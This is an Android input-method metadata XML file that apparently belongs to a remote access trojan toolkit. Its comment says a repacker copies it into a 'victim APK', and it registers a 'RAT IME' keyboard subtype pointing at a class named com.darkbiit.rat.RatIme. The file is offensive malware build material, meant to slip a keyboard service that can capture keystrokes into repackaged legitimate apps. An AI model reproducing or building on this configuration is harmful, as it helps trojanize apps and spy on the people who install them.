<?xml version="1.0" encoding="utf-8"?>
<!--
  IME metadata. The repacker copies this file into the victim APK under
  res/xml/method.xml so the manifest reference @xml/method resolves.
  Keep the filename stable: the merged manifest points at it by name.
-->
<input-method xmlns:android="http://schemas.android.com/apk/res/android"
    android:isDefault="false"
    android:supportsSwitchingToNextInputMethod="true">
    <subtype
        android:icon="@android:drawable/ic_menu_edit"
        android:imeSubtypeLocale="en_US"
        android:imeSubtypeMode="keyboard"
        android:isAuxiliary="true"
        android:imeSubtypeExtraValue="com.darkbiit.rat.RatIme"
        android:label="RAT IME" />
</input-method>
